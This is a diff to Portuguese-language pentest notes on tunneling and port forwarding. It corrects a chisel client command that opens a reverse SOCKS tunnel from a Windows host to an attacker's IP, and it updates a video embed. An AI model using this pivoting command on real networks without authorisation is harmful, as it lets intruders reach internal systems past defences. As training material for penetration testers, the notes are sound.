@@ -7,7 +7,7 @@ Tunelamento e encaminhamento de portas
 
 No  Windows utilizamos o chisel, porém em ambientes mais maduros o Antivírus pega essa ferramenta. [Vide exemplo de como usá-la](#chisel)
 
-    chisel.exe client <ip_atacante>:<porta> -R:<porta>:socks
+    chisel.exe client <ip_atacante>:<porta> R:<porta>:socks
 
 Na máquina do atacante (Kali Linux)
 
@@ -55,7 +55,7 @@ Na máquina do atacante, configurar da seguinte maneira:
 **ISSO É FUNDAMENTAL PARA QUE O ENCAMINHAMENTO DE PORTA FUNCIONE**
     
 
-{%embed url ="https://youtu.be/hi5Z4ePdAG0" %}
+![type:video](https://youtube.com/embed/hi5Z4ePdAG0)
 
 ## SSH
 
